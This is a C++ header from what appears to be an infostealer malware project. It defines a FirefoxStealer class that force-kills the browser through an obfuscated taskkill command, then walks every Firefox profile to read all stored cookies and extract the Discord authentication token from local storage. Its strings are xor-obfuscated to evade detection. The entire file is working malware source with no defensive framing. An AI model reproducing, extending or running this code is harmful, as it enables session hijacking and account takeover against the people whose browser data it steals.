#pragma once


#include "../result.hpp"
#include "../util.hpp"
#include "base.hpp"
#include <sqlite3.h>

class FirefoxStealer : public AbstractStealer {
public:
    FirefoxStealer(std::string executable, std::filesystem::path path)
        : path_(path) {
        hidden_system(va(xor("taskkill /IM %s /F >nul 2>&1"), executable.c_str()).c_str());
    }

    void steal() override {
        auto profiles_path = path_ / "Profiles";
        if (!std::filesystem::exists(profiles_path)) return;

        for (const auto& entry : std::filesystem::directory_iterator(profiles_path)) {
            if (!entry.is_directory()) continue;

            std::filesystem::path profile_path = entry.path();


            auto cookies_path = profile_path / xor("cookies.sqlite");
            if (std::filesystem::exists(cookies_path)) {
                sqlite3* db;
                if (sqlite3_open(cookies_path.string().c_str(), &db) == SQLITE_OK) {
                    sqlite3_stmt* stmt;
                    sqlite3_prepare_v2(db, xor("SELECT host, name, value FROM moz_cookies"),
                                       -1, &stmt, nullptr);
                    while (sqlite3_step(stmt) == SQLITE_ROW) {
                        Cookie cookie;
                        cookie.host = (const char*)sqlite3_column_text(stmt, 0);
                        cookie.name = (const char*)sqlite3_column_text(stmt, 1);
                        cookie.value = (const char*)sqlite3_column_text(stmt, 2);
                        cookies.push_back(std::move(cookie));
                    }
                    sqlite3_finalize(stmt);
                    sqlite3_close(db);
                }
            }


            auto storage_path = profile_path / "storage" / "default" /
                xor("https+++discord.com") / "ls" / "data.sqlite";
            if (std::filesystem::exists(storage_path)) {
                sqlite3* db;
                if (sqlite3_open(storage_path.string().c_str(), &db) == SQLITE_OK) {
                    sqlite3_stmt* stmt;
                    sqlite3_prepare_v2(db, xor("SELECT value FROM data WHERE key = 'token'"),
                                       -1, &stmt, nullptr);
                    if (sqlite3_step(stmt) == SQLITE_ROW) {
                        std::string token = (const char*)sqlite3_column_text(stmt, 0);
                        if (token.size() >= 2)
                            append_discord_token(token.substr(1, token.size() - 2));
                    }
                    sqlite3_finalize(stmt);
                    sqlite3_close(db);
                }
            }
        }
    }

private:
    std::filesystem::path path_;
};
